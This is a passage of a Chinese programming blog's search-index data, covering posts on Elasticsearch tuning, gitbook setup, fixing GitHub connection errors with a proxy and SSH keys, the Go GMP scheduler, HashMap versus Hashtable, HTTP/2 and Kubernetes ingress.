）返回给协调节点，由协调节点进行数据的合并、排序、分页等操作，产出最终结果。 fetch phase：接着由协调节点根据 doc id 去各个节点上拉取实际的 document 数据，最终返回给客户端。   写请求是写入 primary shard，然后同步给所有的 replica shard；读请求可以从 primary shard 或 replica shard 读取，采用的是随机轮询算法。\n 4. 优化ES提升检索效率 4.1 filesystem cache filesystem cache 即文件系统cache，由文件系统进行热点数据缓存，不受进程自主控制。关于cache的详细介绍请 👉 cache和buffer 你往 es 里写的数据，实际上都写到磁盘文件里去了，查询的时候，操作系统会将磁盘文件里的数据自动缓存到 filesystem cache 里面去。\n归根结底，你要让 es 性能要好，最佳的情况下，就是你的机器的内存，至少可以容纳你的总数据量的一半。\n根据我们自己的生产环境实践经验，最佳的情况下，是仅仅在 es 中就存少量的数据，就是你要用来搜索的那些索引，如果内存留给 filesystem cache 的是 100G，那么你就将索引数据控制在 100G 以内，这样的话，你的数据几乎全部走内存来搜索，性能非常之高，一般可以在 1 秒以内。\n比如说你现在有一行数据。 id,name,age .... 30 个字段。但是你现在搜索，只需要根据 id,name,age 三个字段来搜索。如果你傻乎乎往 es 里写入一行数据所有的字段，就会导致说 90% 的数据是不用来搜索的，结果硬是占据了 es 机器上的 filesystem cache 的空间，单条数据的数据量越大，就会导致 filesystem cahce 能缓存的数据就越少。其实，仅仅写入 es 中要用来检索的少数几个字段就可以了，比如说就写入 es id,name,age 三个字段，然后你可以把其他的字段数据存在 mysql/hbase 里，我们一般是建议用 es + hbase 这么一个架构。\nhbase 的特点是适用于海量数据的在线存储，就是对 hbase 可以写入海量数据，但是不要做复杂的搜索，做很简单的一些根据 id 或者范围进行查询的这么一个操作就可以了。从 es 中根据 name 和 age 去搜索，拿到的结果可能就 20 个 doc id ，然后根据 doc id 到 hbase 里去查询每个 doc id 对应的完整的数据，给查出来，再返回给前端。\n写入 es 的数据最好小于等于，或者是略微大于 es 的 filesystem cache 的内存容量。然后你从 es 检索可能就花费 20ms，然后再根据 es 返回的 id 去 hbase 里查询，查 20 条数据，可能也就耗费个 30ms，可能你原来那么玩儿，1T 数据都放 es，会每次查询都是 5~10s，现在可能性能就会很高，每次查询就是 50ms。\n4.2 数据预热 对于那些你觉得比较热的、经常会有人访问的数据，最好做一个专门的缓存预热子系统，就是对热数据每隔一段时间，就提前访问一下，让数据进入 filesystem cache 里面去。这样下次别人访问的时候，性能一定会好很多。\n4.3 冷热分离 假设你有 6 台机器，2 个索引，一个放冷数据，一个放热数据，每个索引 3 个 shard。3 台机器放热数据 index，另外 3 台机器放冷数据 index。然后这样的话，你大量的时间是在访问热数据 index，热数据可能就占总数据量的 10%，此时数据量很少，几乎全都保留在 filesystem cache 里面了，就可以确保热数据的访问性能是很高的。但是对于冷数据而言，是在别的 index 里的，跟热数据 index 不在相同的机器上，大家互相之间都没什么联系了。如果有人访问冷数据，可能大量数据是在磁盘上的，此时性能差点，就 10% 的人去访问冷数据，90% 的人在访问热数据，也无所谓了。\n4.4 document 模型设计 最好是先在 Java 系统里就完成关联，将关联好的数据直接写入 es 中。搜索的时候，就不需要利用 es 的搜索语法来完成 join 之类的关联搜索了。\ndocument 模型设计是非常重要的，很多操作，不要在搜索的时候才想去执行各种复杂的乱七八糟的操作。es 能支持的操作就那么多，不要考虑用 es 做一些它不好操作的事情。如果真的有那种操作，尽量在 document 模型设计的时候，写入的时候就完成。另外对于一些太复杂的操作，比如 join/nested/parent-child 搜索都要尽量避免，性能都很差的。\n4.5 分页性能优化 es 的分页是较坑的，为啥呢？举个例子吧，假如你每页是 10 条数据，你现在要查询第 100 页，实际上是会把每个 shard 上存储的前 1000 条数据都查到一个协调节点上，如果你有个 5 个 shard，那么就有 5000 条数据，接着协调节点对这 5000 条数据进行一些合并、处理，再获取到最终第 100 页的 10 条数据。\n分布式的，你要查第 100 页的 10 条数据，不可能说从 5 个 shard，每个 shard 就查 2 条数据，最后到协调节点合并成 10 条数据吧？你必须得从每个 shard 都查 1000 条数据过来，然后根据你的需求进行排序、筛选等等操作，最后再次分页，拿到里面第 100 页的数据。你翻页的时候，翻的越深，每个 shard 返回的数据就越多，而且协调节点处理的时间越长，非常坑爹。所以用 es 做分页的时候，你会发现越翻到后面，就越是慢。\n我们之前也是遇到过这个问题，用 es 作分页，前几页就几十毫秒，翻到 10 页或者几十页的时候，基本上就要 5~10 秒才能查出来一页数据了。\n有什么解决方案吗？\n不允许深度分页（默认深度分页性能很差）\n跟产品经理说，你系统不允许翻那么深的页，默认翻的越深，性能就越差。\n类似于 app 里的推荐商品不断下拉出来一页一页的\nscroll api 或者 search_after\n参考 基础：\ndoocs/advanced-java 【Elasticsearch 技术分享】—— ES 查询检索数据的过程，是什么样子的？ 全文搜索引擎 Elasticsearch 入门教程 应用场景：\n七个生产案例告诉你BATJ为何选择ElasticSearch！应用场景和优势！ 项目实战：\nElasticsearch快速入门，掌握这些刚刚好！ mall整合Elasticsearch实现商品搜索 Elasticsearch项目实战，商品搜索功能设计与实现！ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/es/es%E7%BB%BC%E8%BF%B0/","series":["Manual"],"tags":["ES"],"title":"ES综述"},{"categories":["其他"],"content":"gitbook安装\n 安装  sudo npm install gitbook -g sudo npm install -g gitbook-cli 验证  gitbook -V 初始化项目  mkdir direName //创建自己的文件夹目录 cd direName //进入到自己的gitbook文件夹目录 gitbook init //初始化gitbook项目 启动  gitbook serve 或者gitbook serve \u0026amp;后台运行，默认在4000端口启动。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/gitbook%E5%AE%89%E8%A3%85/","series":["Manual"],"tags":["Other"],"title":"gitbook安装"},{"categories":["编程思想"],"content":"我们真是一个神奇的国度，连github都要封禁。\n最近github https无法接入：\nfatal: unable to access \u0026#39;https://github.com/xuzhijvn/tony-demo.git/\u0026#39;: LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443 试了n种方式都不行：\n  切换SSR代理节点\n  切换SSR代理模式到全局\n  退出SSR\n  使用蓝灯代理\n  设置git代理（61885是我蓝灯代理的端口）\n  git config --global --list git config --global https.proxy \u0026#39;127.0.0.1:61885\u0026#39; git config --global http.proxy \u0026#39;127.0.0.1:61885\u0026#39; git config --global --list 禁用git代理  git config --global --list git config --global --unset http.proxy git config --global --list networksetup -setv6off Wi-Fi  以上方法全部不好使，折腾了一下午心态崩了💔💔\n最后只能改成通过ssh方式接入了：\n 生成公私钥对  ssh-keygen -t rsa -C \u0026#34;783175223@qq.com\u0026#34; 拷贝到github  pbcopy \u0026lt; ~/.ssh/github_id_rsa.pub 要使用ssh-add命令是把专用密钥添加到ssh-agent的高速缓存中  ssh-add -K ~/.ssh/github_id_rsa 上面的命令在重启电脑之后会失效，所以得通过在~/.ssh/config文件中添加如下内容来取代：  Host * AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/github_id_rsa IdentityFile ~/.ssh/huolala_id_rsa 接入github的时候用ssh模式  参考链接： 工作、开源两不误：Git多账号管理 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/git/github-443/","series":["Manual"],"tags":["github"],"title":"GitHub 443"},{"categories":["编程思想"],"content":"多线程为我们的程序提供了强大的并发能力，但是随着现代应用对并发能力越来越高的要求，仍然通过增加线程数量提升并发能力的做法显然无法维系，因为创建线程要消耗内存，更致命的是众多的线程创建、销毁、切换将大大降低CPU的执行效率。\n如何通过有限的线程数量进一步提升应用的并发能力呢？协程、线程池都是解决之道。\n协程可以看作是用户态的线程，因此协程间的切换并不会有CPU的损耗，并且可以将每个协程设计成几kb大小，以至于可以创建大量的协程。CPU最终调度运行仍然是线程，因此协程与线程之间需要一个 调度器，Golang中有GMP调度器，用于把大量的协程分配到少量线程上去执行。\n 本节为重点章节 本章节含视频版:\n   一、Golang“调度器”的由来？ (1) 单进程时代不需要调度器 我们知道，一切的软件都是跑在操作系统上，真正用来干活(计算)的是CPU。早期的操作系统每个程序就是一个进程，直到一个程序运行完，才能进行下一个进程，就是“单进程时代”\n一切的程序只能串行发生。\n早期的单进程操作系统，面临2个问题：\n1.单一的执行流程，计算机只能一个任务一个任务处理。\n2.进程阻塞所带来的CPU时间浪费。\n那么能不能有多个进程来宏观一起来执行多个任务呢？\n后来操作系统就具有了最早的并发能力：多进程并发，当一个进程阻塞的时候，切换到另外等待执行的进程，这样就能尽量把CPU利用起来，CPU就不浪费了。\n(2)多进程/线程时代有了调度器需求 在多进程/多线程的操作系统中，就解决了阻塞的问题，因为一个进程阻塞cpu可以立刻切换到其他进程中去执行，而且调度cpu的算法可以保证在运行的进程都可以被分配到cpu的运行时间片。这样从宏观来看，似乎多个进程是在同时被运行。\n但新的问题就又出现了，进程拥有太多的资源，进程的创建、切换、销毁，都会占用很长的时间，CPU虽然利用起来了，但如果进程过多，CPU有很大的一部分都被用来进行进程调度了。\n怎么才能提高CPU的利用率呢？\n但是对于Linux操作系统来讲，cpu对进程的态度和线程的态度是一样的。\n很明显，CPU调度切换的是进程和线程。尽管线程看起来很美好，但实际上多线程开发设计会变得更加复杂，要考虑很多同步竞争等问题，如锁、竞争冲突等。\n(3)协程来提高CPU利用率 多进程、多线程已经提高了系统的并发能力，但是在当今互联网高并发场景下，为每个任务都创建一个线程是不现实的，因为会消耗大量的内存(进程虚拟内存会占用4GB[32位操作系统], 而线程也要大约4MB)。\n大量的进程/线程出现了新的问题\n 高内存占用 调度的高消耗CPU  好了，然后工程师们就发现，其实一个线程分为“内核态“线程和”用户态“线程。\n一个“用户态线程”必须要绑定一个“内核态线程”，但是CPU并不知道有“用户态线程”的存在，它只知道它运行的是一个“内核态线程”(Linux的PCB进程控制块)。\n这样，我们再去细化去分类一下，内核线程依然叫“线程(thread)”，用户线程叫“协程(co-routine)\u0026quot;.\n看到这里，我们就要开脑洞了，既然一个协程(co-routine)可以绑定一个线程(thread)，那么能不能多个协程(co-routine)绑定一个或者多个线程(thread)上呢。\n之后，我们就看到了有3中协程和线程的映射关系：\n N:1关系  N个协程绑定1个线程，优点就是协程在用户态线程即完成切换，不会陷入到内核态，这种切换非常的轻量快速。但也有很大的缺点，1个进程的所有协程都绑定在1个线程上\n缺点：\n 某个程序用不了硬件的多核加速能力 一旦某协程阻塞，造成线程阻塞，本进程的其他协程都无法执行了，根本就没有并发的能力了。   1:1 关系  1个协程绑定1个线程，这种最容易实现。协程的调度都由CPU完成了，不存在N:1缺点，\n缺点：\n 协程的创建、删除和切换的代价都由CPU完成，有点略显昂贵了。   M:N关系  M个协程绑定1个线程，是N:1和1:1类型的结合，克服了以上2种模型的缺点，但实现起来最为复杂。\n协程跟线程是有区别的，线程由CPU调度是抢占式的，协程由用户态调度是协作式的，一个协程让出CPU后，才执行下一个协程。\n(4)Go语言的协程goroutine Go为了提供更容易使用的并发方法，使用了goroutine和channel。goroutine来自协程的概念，让一组可复用的函数运行在一组线程之上，即使有协程阻塞，该线程的其他协程也可以被runtime调度，转移到其他可运行的线程上。最关键的是，程序员看不到这些底层的细节，这就降低了编程的难度，提供了更容易的并发。\nGo中，协程被称为goroutine，它非常轻量，一个goroutine只占几KB，并且这几KB就足够goroutine运行完，这就能在有限的内存空间内支持大量goroutine，支持了更多的并发。虽然一个goroutine的栈只占几KB，但实际是可伸缩的，如果需要更多内容，runtime会自动为goroutine分配。\nGoroutine特点：\n 占用内存更小（几kb） 调度更灵活(runtime调度)  (5)被废弃的goroutine调度器 好了，既然我们知道了协程和线程的关系，那么最关键的一点就是调度协程的调度器的实现了。\nGo目前使用的调度器是2012年重新设计的，因为之前的调度器性能存在问题，所以使用4年就被废弃了，那么我们先来分析一下被废弃的调度器是如何运作的？\n 大部分文章都是会用G来表示Goroutine，用M来表示线程，那么我们也会用这种表达的对应关系。\n 下面我们来看看被废弃的golang调度器是如何实现的？\nM想要执行、放回G都必须访问全局G队列，并且M有多个，即多线程访问同一资源需要加锁进行保证互斥/同步，所以全局G队列是有互斥锁进行保护的。\n老调度器有几个缺点：\n 创建、销毁、调度G都需要每个M获取锁，这就形成了激烈的锁竞争。 M转移G会造成延迟和额外的系统负载。比如当G中包含创建新协程的时候，M创建了G’，为了继续执行G，需要把G’交给M’执行，也造成了很差的局部性，因为G’和G是相关的，最好放在M上执行，而不是其他M'。 系统调用(CPU在M之间的切换)导致频繁的线程阻塞和取消阻塞操作增加了系统开销。  二、Goroutine调度器的GMP模型的设计思想 面对之前调度器的问题，Go设计了新的调度器。\n在新调度器中，除了M(thread)和G(goroutine)，又引进了P(Processor)。\nProcessor，它包含了运行goroutine的资源，如果线程想运行goroutine，必须先获取P，P中还包含了可运行的G队列。\n(1)GMP模型 在Go中，线程是运行goroutine的实体，调度器的功能是把可运行的goroutine分配到工作线程上。\n 全局队列（Global Queue）：存放等待运行的G。 P的本地队列：同全局队列类似，存放的也是等待运行的G，存的数量有限，不超过256个。新建G\u0026rsquo;时，G\u0026rsquo;优先加入到P的本地队列，如果队列满了，则会把本地队列中一半的G移动到全局队列。 P列表：所有的P都在程序启动时创建，并保存在数组中，最多有GOMAXPROCS(可配置)个。 M：线程想运行任务就得获取P，从P的本地队列获取G，P队列为空时，M也会尝试从全局队列拿一批G放到P的本地队列，或从其他P的本地队列偷一半放到自己P的本地队列。M运行G，G执行之后，M会从P获取下一个G，不断重复下去。  Goroutine调度器和OS调度器是通过M结合起来的，每个M都代表了1个内核线程，OS调度器负责把内核线程分配到CPU的核上执行。\n 有关P和M的个数问题  1、P的数量：\n 由启动时环境变量$GOMAXPROCS或者是由runtime的方法GOMAXPROCS()决定。这意味着在程序执行的任意时刻都只有$GOMAXPROCS个goroutine在同时运行。  2、M的数量:\n go语言本身的限制：go程序启动时，会设置M的最大数量，默认10000.但是内核很难支持这么多的线程数，所以这个限制可以忽略。 runtime/debug中的SetMaxThreads函数，设置M的最大数量 一个M阻塞了，会创建新的M。  M与P的数量没有绝对关系，一个M阻塞，P就会去创建或者切换另一个M，所以，即使P的默认数量是1，也有可能会创建很多个M出来。\n P和M何时会被创建  1、P何时创建：在确定了P的最大数量n后，运行时系统会根据这个数量创建n个P。\n2、M何时创建：没有足够的M来关联P并运行其中的可运行的G。比如所有的M此时都阻塞住了，而P中还有很多就绪任务，就会去寻找空闲的M，而没有空闲的，就会去创建新的M。\n(2)调度器的设计策略 复用线程：避免频繁的创建、销毁线程，而是对线程的复用。\n1）work stealing机制\n当本线程无可运行的G时，尝试从其他线程绑定的P偷取G，而不是销毁线程。\n2）hand off机制\n当本线程因为G进行系统调用阻塞时，线程释放绑定的P，把P转移给其他空闲的线程执行。\n利用并行：GOMAXPROCS设置P的数量，最多有GOMAXPROCS个线程分布在多个CPU上同时运行。GOMAXPROCS也限制了并发的程度，比如GOMAXPROCS = 核数/2，则最多利用了一半的CPU核进行并行。\n抢占：在coroutine中要等待一个协程主动让出CPU才执行下一个协程，在Go中，一个goroutine最多占用CPU 10ms，防止其他goroutine被饿死，这就是goroutine不同于coroutine的一个地方。\n全局G队列：在新的调度器中依然有全局G队列，但功能已经被弱化了，当M执行work stealing从其他P偷不到G时，它可以从全局G队列获取G。\n(3) go func() 调度流程 从上图我们可以分析出几个结论：\n1、我们通过 go func()来创建一个goroutine；\n2、有两个存储G的队列，一个是局部调度器P的本地队列、一个是全局G队列。新创建的G会先保存在P的本地队列中，如果P的本地队列已经满了就会保存在全局的队列中；\n3、G只能运行在M中，一个M必须持有一个P，M与P是1：1的关系。M会从P的本地队列弹出一个可执行状态的G来执行，如果P的本地队列为空，就会想其他的MP组合偷取一个可执行的G来执行；\n4、一个M调度G执行的过程是一个循环机制；\n5、当M执行某一个G时候如果发生了syscall或则其余阻塞操作，M会阻塞，如果当前有一些G在执行，runtime会把这个线程M从P中摘除(detach)，然后再创建一个新的操作系统的线程(如果有空闲的线程可用就复用空闲线程)来服务于这个P；\n6、当M系统调用结束时候，这个G会尝试获取一个空闲的P执行，并放入到这个P的本地队列。如果获取不到P，那么这个线程M变成休眠状态， 加入到空闲线程中，然后这个G会被放入全局队列中。\n(4)调度器的生命周期 特殊的M0和G0\nM0\nM0是启动程序后的编号为0的主线程，这个M对应的实例会在全局变量runtime.m0中，不需要在heap上分配，M0负责执行初始化操作和启动第一个G， 在之后M0就和其他的M一样了。\nG0\nG0是每次启动一个M都会第一个创建的gourtine，G0仅用于负责调度的G，G0不指向任何可执行的函数, 每个M都会有一个自己的G0。在调度或系统调用时会使用G0的栈空间, 全局变量的G0是M0的G0。\n我们来跟踪一段代码\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello world\u0026#34;) } 接下来我们来针对上面的代码对调度器里面的结构做一个分析。\n也会经历如上图所示的过程：\n runtime创建最初的线程m0和goroutine g0，并把2者关联。 调度器初始化：初始化m0、栈、垃圾回收，以及创建和初始化由GOMAXPROCS个P构成的P列表。 示例代码中的main函数是main.main，runtime中也有1个main函数——runtime.main，代码经过编译后，runtime.main会调用main.main，程序启动时会为runtime.main创建goroutine，称它为main goroutine吧，然后把main goroutine加入到P的本地队列。 启动m0，m0已经绑定了P，会从P的本地队列获取G，获取到main goroutine。 G拥有栈，M根据G中的栈信息和调度信息设置运行环境 M运行G G退出，再次回到M获取可运行的G，这样重复下去，直到main.main退出，runtime.main执行Defer和Panic处理，或调用runtime.exit退出程序。  调度器的生命周期几乎占满了一个Go程序的一生，runtime.main的goroutine执行之前都是为调度器做准备工作，runtime.main的goroutine运行，才是调度器的真正开始，直到runtime.main结束而结束。\n(5)可视化GMP编程 有2种方式可以查看一个程序的GMP的数据。\n方式1：go tool trace\ntrace记录了运行时的信息，能提供可视化的Web页面。\n简单测试代码：main函数创建trace，trace会运行在单独的goroutine中，然后main打印\u0026quot;Hello World\u0026quot;退出。\n trace.go\n package main import ( \u0026#34;os\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;runtime/trace\u0026#34; ) func main() { //创建trace文件  f, err := os.Create(\u0026#34;trace.out\u0026#34;) if err != nil { panic(err) } defer f.Close() //启动trace goroutine  err = trace.Start(f) if err != nil { panic(err) } defer trace.Stop() //main  fmt.Println(\u0026#34;Hello World\u0026#34;) } 运行程序\n$ go run trace.go Hello World 会得到一个trace.out文件，然后我们可以用一个工具打开，来分析这个文件。\n$ go tool trace trace.out 2020/02/23 10:44:11 Parsing trace... 2020/02/23 10:44:11 Splitting trace... 2020/02/23 10:44:11 Opening browser. Trace viewer is listening on http://127.0.0.1:33479 我们可以通过浏览器打开http://127.0.0.1:33479网址，点击view trace 能够看见可视化的调度流程。\nG信息\n点击Goroutines那一行可视化的数据条，我们会看到一些详细的信息。\n一共有两个G在程序中，一个是特殊的G0，是每个M必须有的一个初始化的G，这个我们不必讨论。\n其中G1应该就是main goroutine(执行main函数的协程)，在一段时间内处于可运行和运行的状态。\nM信息\n点击Threads那一行可视化的数据条，我们会看到一些详细的信息。\n一共有两个M在程序中，一个是特殊的M0，用于初始化使用，这个我们不必讨论。\nP信息\nG1中调用了main.main，创建了trace goroutine g18。G1运行在P1上，G18运行在P0上。\n这里有两个P，我们知道，一个P必须绑定一个M才能调度G。\n我们在来看看上面的M信息。\n我们会发现，确实G18在P0上被运行的时候，确实在Threads行多了一个M的数据，点击查看如下： 多了一个M2应该就是P0为了执行G18而动态创建的M2.\n方式2：Debug trace\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { for i := 0; i \u0026lt; 5; i++ { time.Sleep(time.Second) fmt.Println(\u0026#34;Hello World\u0026#34;) } } 编译\n$ go build trace2.go 通过Debug方式运行\n$ GODEBUG=schedtrace=1000 ./trace2 SCHED 0ms: gomaxprocs=2 idleprocs=0 threads=4 spinningthreads=1 idlethreads=1 runqueue=0 [0 0] Hello World SCHED 1003ms: gomaxprocs=2 idleprocs=2 threads=4 spinningthreads=0 idlethreads=2 runqueue=0 [0 0] Hello World SCHED 2014ms: gomaxprocs=2 idleprocs=2 threads=4 spinningthreads=0 idlethreads=2 runqueue=0 [0 0] Hello World SCHED 3015ms: gomaxprocs=2 idleprocs=2 threads=4 spinningthreads=0 idlethreads=2 runqueue=0 [0 0] Hello World SCHED 4023ms: gomaxprocs=2 idleprocs=2 threads=4 spinningthreads=0 idlethreads=2 runqueue=0 [0 0] Hello World  SCHED：调试信息输出标志字符串，代表本行是goroutine调度器的输出； 0ms：即从程序启动到输出这行日志的时间； gomaxprocs: P的数量，本例有2个P, 因为默认的P的属性是和cpu核心数量默认一致，当然也可以通过GOMAXPROCS来设置； idleprocs: 处于idle状态的P的数量；通过gomaxprocs和idleprocs的差值，我们就可知道执行go代码的P的数量； threads: os threads/M的数量，包含scheduler使用的m数量，加上runtime自用的类似sysmon这样的thread的数量； spinningthreads: 处于自旋状态的os thread数量； idlethread: 处于idle状态的os thread的数量； runqueue=0： Scheduler全局队列中G的数量； [0 0]: 分别为2个P的local queue中的G的数量。  下一篇，我们来继续详细的分析GMP调度原理的一些场景问题。\n三、Go调度器调度场景过程全解析 (1)场景1 P拥有G1，M1获取P后开始运行G1，G1使用go func()创建了G2，为了局部性G2优先加入到P1的本地队列。\n (2)场景2 G1运行完成后(函数：goexit)，M上运行的goroutine切换为G0，G0负责调度时协程的切换（函数：schedule）。从P的本地队列取G2，从G0切换到G2，并开始运行G2(函数：execute)。实现了线程M1的复用。\n (3)场景3 假设每个P的本地队列只能存4个G。G2要创建了6个G，前4个G（G3, G4, G5, G6）已经加入p1的本地队列，p1本地队列满了。\n (4)场景4 G2在创建G7的时候，发现P1的本地队列已满，需要执行负载均衡(把P1中本地队列中前一半的G，还有新创建G转移到全局队列)\n （实现中并不一定是新的G，如果G是G2之后就执行的，会被保存在本地队列，利用某个老的G替换新G加入全局队列）\n 这些G被转移到全局队列时，会被打乱顺序。所以G3,G4,G7被转移到全局队列。\n (5)场景5 G2创建G8时，P1的本地队列未满，所以G8会被加入到P1的本地队列。\nG8加入到P1点本地队列的原因还是因为P1此时在与M1绑定，而G2此时是M1在执行。所以G2创建的新的G会优先放置到自己的M绑定的P上。\n (6)场景6 规定：在创建G时，运行的G会尝试唤醒其他空闲的P和M组合去执行。\n假定G2唤醒了M2，M2绑定了P2，并运行G0，但P2本地队列没有G，M2此时为自旋线程**（没有G但为运行状态的线程，不断寻找G）**。\n (7)场景7 M2尝试从全局队列(简称“GQ”)取一批G放到P2的本地队列（函数：findrunnable()）。M2从全局队列取的G数量符合下面的公式：\nn = min(len(GQ)/GOMAXPROCS + 1, len(GQ/2)) 至少从全局队列取1个g，但每次不要从全局队列移动太多的g到p本地队列，给其他p留点。这是从全局队列到P本地队列的负载均衡。\n假定我们场景中一共有4个P（GOMAXPROCS设置为4，那么我们允许最多就能用4个P来供M使用）。所以M2只从能从全局队列取1个G（即G3）移动P2本地队列，然后完成从G0到G3的切换，运行G3。\n (8)场景8 假设G2一直在M1上运行，经过2轮后，M2已经把G7、G4从全局队列获取到了P2的本地队列并完成运行，全局队列和P2的本地队列都空了,如场景8图的左半部分。\n全局队列已经没有G，那m就要执行work stealing(偷取)：从其他有G的P哪里偷取一半G过来，放到自己的P本地队列。P2从P1的本地队列尾部取一半的G，本例中一半则只有1个G8，放到P2的本地队列并执行。\n (9)场景9 G1本地队列G5、G6已经被其他M偷走并运行完成，当前M1和M2分别在运行G2和G8，M3和M4没有goroutine可以运行，M3和M4处于自旋状态，它们不断寻找goroutine。\n为什么要让m3和m4自旋，自旋本质是在运行，线程在运行却没有执行G，就变成了浪费CPU. 为什么不销毁现场，来节约CPU资源。因为创建和销毁CPU也会浪费时间，我们希望当有新goroutine创建时，立刻能有M运行它，如果销毁再新建就增加了时延，降低了效率。当然也考虑了过多的自旋线程是浪费CPU，所以系统中最多有GOMAXPROCS个自旋的线程(当前例子中的GOMAXPROCS=4，所以一共4个P)，多余的没事做线程会让他们休眠。\n (10)场景10 假定当前除了M3和M4为自旋线程，还有M5和M6为空闲的线程(没有得到P的绑定，注意我们这里最多就只能够存在4个P，所以P的数量应该永远是M\u0026gt;=P, 大部分都是M在抢占需要运行的P)，G8创建了G9，G8进行了阻塞的系统调用，M2和P2立即解绑，P2会执行以下判断：如果P2本地队列有G、全局队列有G或有空闲的M，P2都会立马唤醒1个M和它绑定，否则P2则会加入到空闲P列表，等待M来获取可用的p。本场景中，P2本地队列有G9，可以和其他空闲的线程M5绑定。\n (11)场景11 G8创建了G9，假如G8进行了非阻塞系统调用。\nM2和P2会解绑，但M2会记住P2，然后G8和M2进入系统调用状态。当G8和M2退出系统调用时，会尝试获取P2，如果无法获取，则获取空闲的P，如果依然没有，G8会被记为可运行状态，并加入到全局队列,M2因为没有P的绑定而变成休眠状态(长时间休眠等待GC回收销毁)。\n 四、小结 总结，Go调度器很轻量也很简单，足以撑起goroutine的调度工作，并且让Go具有了原生（强大）并发的能力。Go调度本质是把大量的goroutine分配到少量线程上去执行，并利用多核并行，实现更强大的并发。\n 参考链接 Golang的协程调度器原理及GMP设计思想？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/go/golang%E7%9A%84%E5%8D%8F%E7%A8%8B%E8%B0%83%E5%BA%A6%E5%99%A8%E5%8E%9F%E7%90%86%E5%8F%8Agmp%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3/","series":["Manual"],"tags":["GO"],"title":"Golang的协程调度器原理及GMP设计思想"},{"categories":["编程思想"],"content":"方法一：调整PATH export PATH=/usr/local/go/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin 方法二：调整软链接(未验证) //查看当前软链接指向 cd /usr/local/bin ls -trl | grep go //调整软链接 ln -snf /usr/local/Cellar/go/1.16.3/bin go ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/go/go%E5%A4%9A%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2/","series":["Manual"],"tags":["GO"],"title":"go多版本切换"},{"categories":["编程思想"],"content":" HashMap是HashTable的轻量级版本， HashTable是线程安全的，其方法都被synchronized关键同步 HashMap 把 Hashtable 的 contains 方法去掉了，改成 containsValue 和 containsKey。因为 contains 方法容易让人引起误解。 HashMap允许将 null 作为一个 entry 的 key 或者 value，而 Hashtable 不允许。 HashTable 继承自 Dictionary 类，而 HashMap 是 Java1.2 引进的 Map interface 的一个实现。 Hashtable 和 HashMap 采用的 hash/rehash 算法都大概一样，所以性能不会有很大的差异。  ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/hashmap%E5%92%8Chashtable%E5%8C%BA%E5%88%AB/","series":["Manual"],"tags":["Java"],"title":"HashMap和HashTable区别"},{"categories":["计算机科学"],"content":"http/2在http/1系列的基础上优化了通信效率，主要得益于如下几点改进：\n1. 多路复用的单一长连接 1.1 单一长连接 在HTTP/2中，客户端向某个域名的服务器请求页面的过程中，只会创建一条TCP连接，即使这页面可能包含上百个资源。 单一的连接应该是HTTP2的主要优势，单一的连接能减少TCP握手（还有ssl握手的开销）带来的时延 。HTTP2中用一条单一的长连接，避免了创建多个TCP连接带来的网络开销，提高了吞吐量。\n1.2 多路复用 HTTP2虽然只有一条TCP连接，但是在逻辑上分成了很多stream。HTTP2把要传输的信息分割成一个个二进制帧，首部信息会被封装到HEADER Frame，相应的request body就放到DATA Frame,一个帧你可以看成路上的一辆车,只要给这些车编号，让1号车都走1号门出，2号车都走2号门出，就把不同的http请求或者响应区分开来了。但是，这里要求同一个请求或者响应的帧必须是有有序的，要保证FIFO的，但是不同的请求或者响应帧可以互相穿插。这就是HTTP2的多路复用，是不是充分利用了网络带宽，是不是提高了并发度？\n2. 头部压缩和二进制格式 http1.x一直都是plain text，对此我只能想到一个优点，便于阅读和debug。但是，现在很多都走https，SSL也把plain text变成了二进制，那这个优点也没了。 于是HTTP2搞了个HPACK压缩来压缩头部，减少报文大小(调试这样的协议将需要curl这样的工具，要进一步地分析网络数据流需要类似Wireshark的http2解析器)。\n3. 服务端推送Server Push 这个功能通常被称作“缓存推送”。主要的思想是：当一个客户端请求资源X，而服务器知道它很可能也需要资源Z的情况下，服务器可以在客户端发送请求前，主动将资源Z推送给客户端。这个功能帮助客户端将Z放进缓存以备将来之需。\n总结  单一的长连接，减少了SSL握手的开销 头部被压缩，减少了数据传输量 多路复用能大幅提高传输效率，不用等待上一个请求的响应 不用像http1.x那样把多个文件或者资源弄成一个文件或者资源（http1.x常见的优化手段），这时候，缓存就能更容易命中啊（http1.x里面你揉成一团的东西怎么命中缓存？）  参考 HTTP/2 相比 1.0 有哪些重大改进？ HTTP 2 的新特性你 get 了吗？ HTTP/2 服务器推送（Server Push）教程 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/http/http2/","series":["Manual"],"tags":["CS","http"],"title":"http2"},{"categories":["云原生"],"content":"1. ingress是什么 ingress是k8s一种资源对象，如k8s的Deployment、Service资源对象一样。它是一种集群维度暴露服务的方式，正如k8s的ClusterIP、NodePort、LoadBalance一样，但是ClusterIP的方式只能在集群内部访问，NodePort方式的话，测试环境使用还行，当有几十上百的服务在集群中运行时，NodePort的端口管理是灾难，LoadBalance方式受限于云平台，且通常在云平台部署ELB还需要额外的费用。ingress规则是很灵活的，可以根据不同域名、不同path转发请求到不同的service，并且支持https/http。\n2. ingress与ingress-controller 要理解ingress，需要区分两个概念，ingress和ingress-controller：\n ingress：指的是k8s中的一个api对象，一般用yaml配置。作用是定义请求如何转发到service的规则，可以理解为配置模板。 